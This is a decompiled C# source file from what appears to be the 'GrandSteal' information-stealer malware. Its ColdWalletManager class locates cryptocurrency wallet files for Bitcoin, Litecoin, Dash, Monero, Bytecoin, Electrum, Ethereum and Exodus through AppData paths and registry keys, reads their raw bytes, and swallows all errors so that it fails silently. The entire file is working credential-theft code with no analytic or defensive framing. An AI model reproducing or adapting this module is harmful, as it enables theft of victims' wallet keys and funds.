using System;
using System.Collections.Generic;
using System.IO;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;
using Microsoft.Win32;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001C RID: 28
	public class ColdWalletManager : ICredentialsManager<ColdWallet>
	{
		// Token: 0x060000C5 RID: 197 RVA: 0x00005D58 File Offset: 0x00003F58
		public IEnumerable<ColdWallet> GetAll()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				ColdWallet coldWallet = this.GrabLitecoin();
				ColdWallet coldWallet2 = this.GrabBitcoinQt();
				ColdWallet coldWallet3 = this.GrabBitcoin();
				ColdWallet coldWallet4 = this.GrabDashQt();
				ColdWallet coldWallet5 = this.GrabLitecoinQt();
				ColdWallet coldWallet6 = this.GrabMonero();
				if (coldWallet != null)
				{
					list.Add(coldWallet);
				}
				if (coldWallet2 != null)
				{
					list.Add(coldWallet2);
				}
				if (coldWallet3 != null)
				{
					list.Add(coldWallet3);
				}
				if (coldWallet4 != null)
				{
					list.Add(coldWallet4);
				}
				if (coldWallet5 != null)
				{
					list.Add(coldWallet5);
				}
				if (coldWallet6 != null)
				{
					list.Add(coldWallet6);
				}
				foreach (ColdWallet coldWallet7 in (this.GrabBytecoin() ?? new List<ColdWallet>()))
				{
					if (coldWallet7 != null)
					{
						list.Add(coldWallet7);
					}
				}
				foreach (ColdWallet coldWallet8 in (this.GrabElectrum() ?? new List<ColdWallet>()))
				{
					if (coldWallet8 != null)
					{
						list.Add(coldWallet8);
					}
				}
				foreach (ColdWallet coldWallet9 in (this.GrabEthereum() ?? new List<ColdWallet>()))
				{
					if (coldWallet9 != null)
					{
						list.Add(coldWallet9);
					}
				}
				foreach (ColdWallet coldWallet10 in (this.GrabExodus() ?? new List<ColdWallet>()))
				{
					if (coldWallet10 != null)
					{
						list.Add(coldWallet10);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x00005F6C File Offset: 0x0000416C
		private ColdWallet GrabLitecoin()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Litecoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Litecoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x00005FDC File Offset: 0x000041DC
		private ColdWallet GrabBitcoinQt()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software");
				RegistryKey registryKey2;
				if (registryKey == null)
				{
					registryKey2 = null;
				}
				else
				{
					RegistryKey registryKey3 = registryKey.OpenSubKey("Bitcoin");
					registryKey2 = ((registryKey3 != null) ? registryKey3.OpenSubKey("Bitcoin-Qt") : null);
				}
				using (RegistryKey registryKey4 = registryKey2)
				{
					string path = ((registryKey4 != null) ? registryKey4.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Bitcoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x000060A4 File Offset: 0x000042A4
		private ColdWallet GrabBitcoin()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Bitcoin\\wallet.dat";
				if (File.Exists(path))
				{
					byte[] array = File.ReadAllBytes(path);
					if (array != null)
					{
						return new ColdWallet
						{
							DataArray = array,
							WalletName = "Bitcoin",
							Name = "wallet.dat"
						};
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00006114 File Offset: 0x00004314
		private IEnumerable<ColdWallet> GrabBytecoin()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Extension.Equals(".wallet"))
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Bytecoin"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000CA RID: 202 RVA: 0x000061C8 File Offset: 0x000043C8
		private IEnumerable<ColdWallet> GrabExodus()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						byte[] array = File.ReadAllBytes(fileInfo.FullName);
						if (array != null)
						{
							list.Add(new ColdWallet
							{
								DataArray = array,
								Name = fileInfo.Name,
								WalletName = "Exodus"
							});
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000CB RID: 203 RVA: 0x00006268 File Offset: 0x00004468
		private ColdWallet GrabDashQt()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("Dash");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("Dash-Qt") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					string path = ((registryKey4 != null) ? registryKey4.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Dash-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000CC RID: 204 RVA: 0x00006338 File Offset: 0x00004538
		private IEnumerable<ColdWallet> GrabElectrum()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Electrum"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000CD RID: 205 RVA: 0x000063E0 File Offset: 0x000045E0
		private IEnumerable<ColdWallet> GrabEthereum()
		{
			List<ColdWallet> list = new List<ColdWallet>();
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets");
				if (directoryInfo.Exists)
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						if (fileInfo.Exists)
						{
							byte[] array = File.ReadAllBytes(fileInfo.FullName);
							if (array != null)
							{
								list.Add(new ColdWallet
								{
									DataArray = array,
									Name = fileInfo.Name,
									WalletName = "Ethereum"
								});
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00006488 File Offset: 0x00004688
		private ColdWallet GrabLitecoinQt()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("Litecoin");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("Litecoin-Qt") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					string path = ((registryKey4 != null) ? registryKey4.GetValue("strDataDir").ToString() : null) + "\\wallet.dat";
					if (File.Exists(path))
					{
						byte[] array = File.ReadAllBytes(path);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Litecoin-Qt",
								Name = "wallet.dat"
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000CF RID: 207 RVA: 0x00006558 File Offset: 0x00004758
		private ColdWallet GrabMonero()
		{
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey;
				if (currentUser == null)
				{
					registryKey = null;
				}
				else
				{
					RegistryKey registryKey2 = currentUser.OpenSubKey("Software");
					if (registryKey2 == null)
					{
						registryKey = null;
					}
					else
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey("monero-project");
						registryKey = ((registryKey3 != null) ? registryKey3.OpenSubKey("monero-core") : null);
					}
				}
				using (RegistryKey registryKey4 = registryKey)
				{
					char[] separator = new char[]
					{
						'\\'
					};
					string text = (registryKey4 != null) ? registryKey4.GetValue("wallet_path").ToString().Replace("/", "\\") : null;
					if (File.Exists(text))
					{
						byte[] array = File.ReadAllBytes(text);
						if (array != null)
						{
							return new ColdWallet
							{
								DataArray = array,
								WalletName = "Monero",
								Name = text.Split(separator)[text.Split(separator).Length - 1]
							};
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}
	}
}
